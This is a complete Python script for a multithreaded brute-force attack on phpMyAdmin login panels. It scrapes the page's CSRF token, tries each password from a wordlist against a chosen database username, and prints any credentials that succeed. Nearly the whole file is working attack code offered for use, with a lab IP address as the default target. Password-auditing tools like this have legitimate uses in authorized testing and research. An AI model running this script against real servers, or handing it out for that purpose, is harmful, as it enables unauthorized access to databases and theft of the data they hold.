#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import threading
import argparse
import time
from bs4 import BeautifulSoup as bs4

class TargetData:
    def __init__(self, php_my_admin_url: str):
        self.php_my_admin_url = php_my_admin_url
        self.authorization_session = requests.Session()
        self.gotten_html = self.authorization_session.get(self.php_my_admin_url)
        self.soup = bs4(self.gotten_html.content, 'lxml')

    def get_parse_csrf_token(self) -> str:
        csrf_token_value = self.soup.find('input', {'name': 'token'})['value']
        return csrf_token_value

    def get_parse_server(self) -> str:
        server_value = self.soup.find('input', {'name': 'server'})['value']
        return server_value

class PhpMyAdminAuthorization(TargetData):
    def __init__(self, php_my_admin_url: str, user_name: str, user_password: str):
        super().__init__(php_my_admin_url=php_my_admin_url)
        self.user_name = user_name
        self.user_password = user_password

    def login_attempt(self) -> str:
        authorization_data = {'pma_username': self.user_name, 'pma_password': self.user_password,
                              'server': self.get_parse_server(),
                              'target': 'index.php',
                              'token': self.get_parse_csrf_token()}

        request_authorization = self.authorization_session.post(self.php_my_admin_url, data=authorization_data)
        result_authorization = request_authorization.text
        return result_authorization

    def get_result_authorization(self) -> bool:
        is_result_authorization = False
        failed_authorization_messages = f"Cannot log in to the MySQL server"
        if failed_authorization_messages not in self.login_attempt():
            is_result_authorization = True
        return is_result_authorization

class UserArgument:
    def __init__(self):
        self.user_settings_for_brute_force = argparse.ArgumentParser(
            description='Instructions for using the program')
        self.add_arguments()
        self.brute_force_settings = self.user_settings_for_brute_force.parse_args()
        self.target_for_attack = self.brute_force_settings.target
        self.check_valid_target_url()
        self.username = self.brute_force_settings.username
        self.check_valid_password_list()
        self.password_list = [str(password).strip('\n') for password in self.brute_force_settings.password_list]
        self.number_threads = self.brute_force_settings.rate
        self.check_valid_type_rate()

    def add_arguments(self):
        self.user_settings_for_brute_force.add_argument('-t', '--target', default='http://172.18.12.12/phpmyadmin',
                                                        nargs='?',
                                                        help='Link to admin panel phpmyadmin '
                                                             'format: http://site.ru/phpmyadmin')

        self.user_settings_for_brute_force.add_argument('-u', '--username', default='phpmyadmin', nargs='?',
                                                        help='Database username.')

        self.user_settings_for_brute_force.add_argument('-p', '--password_list', default='10_random_pass', nargs='?',
                                                        help='The path to the file with passwords can be either sexual '
                                                             'or relative. There must be one password on one line.')

        self.user_settings_for_brute_force.add_argument('-r', '--rate', default='10', nargs='?',
                                                        help='The number of threads with which the program will start '
                                                             'working. The number of streams should not exceed '
                                                             'the number of passwords in your password list.')

    def check_valid_target_url(self):
        try:
            TargetData(self.target_for_attack).get_parse_csrf_token()

        except TypeError:
            print('\nThi\'s target not phpmyadmin panel\n')
            self.target_for_attack = input('Enter the correct url: ')
            self.check_valid_target_url()

    def check_valid_password_list(self):
        try:
            self.brute_force_settings.password_list = open(f'{self.brute_force_settings.password_list}', 'r',
                                                           encoding='utf8')
        except FileNotFoundError:
            print('\nCould not find file\n')
            self.brute_force_settings.password_list = input('Enter the correct path to the file: ')
            self.check_valid_password_list()

    def check_valid_type_rate(self):
        if self.number_threads.isdigit() is not True or int(self.number_threads) > len(self.password_list) + 1:
            print('\nGiven number of threads, not an integer or entered incorrectly\n')
            self.number_threads = input('Enter the correct number of threads: ')
            self.check_valid_type_rate()
        self.number_threads = int(self.number_threads)

    def get_target_attack(self) -> str:
        return self.target_for_attack

    def get_username(self) -> str:
        return self.username

    def get_password_list(self) -> list:
        return self.password_list

    def get_number_threads(self) -> str:
        return self.number_threads

class BruteForceAttack:
    def __init__(self):
        self.attack_target = user_setting.get_target_attack()
        self.username = user_setting.get_username()
        self.passwords_list = user_setting.get_password_list()

    def start_attack(self, start_of_list: int, end_of_list: int):
        start_time = time.monotonic()
        list_one_thread = self.passwords_list[start_of_list:end_of_list]
        for password in list_one_thread:
            try:
                login_attempt_phpmyadmin = PhpMyAdminAuthorization(php_my_admin_url=f'{self.attack_target}/index.php',
                                                                   user_name=self.username, user_password=password)
                if login_attempt_phpmyadmin.get_result_authorization():
                    print(f'login: {login_attempt_phpmyadmin.user_name} |'
                          f' password: {login_attempt_phpmyadmin.user_password} ')
                    print(time.monotonic() - start_time)
            except IndexError:
                pass

class Threads(threading.Thread):
    def __init__(self, start_of_list, end_of_list):
        threading.Thread.__init__(self)
        self.start_of_list = start_of_list
        self.end_of_list = end_of_list

    def run(self):
        brute_force_attack.start_attack(self.start_of_list, self.end_of_list)

class StartProgram:
    def __init__(self):
        self.number_threads = int(user_setting.get_number_threads())
        self.length_password_list = len(user_setting.get_password_list())

    def main(self):
        start_list = 0
        max_list = self.length_password_list // self.number_threads
        for i in range(self.number_threads):
            thread = Threads(start_list, max_list)
            start_list = max_list
            max_list = start_list + self.length_password_list // self.number_threads
            thread.start()

if __name__ == '__main__':
    user_setting = UserArgument()
    brute_force_attack = BruteForceAttack()
    StartProgram().main()
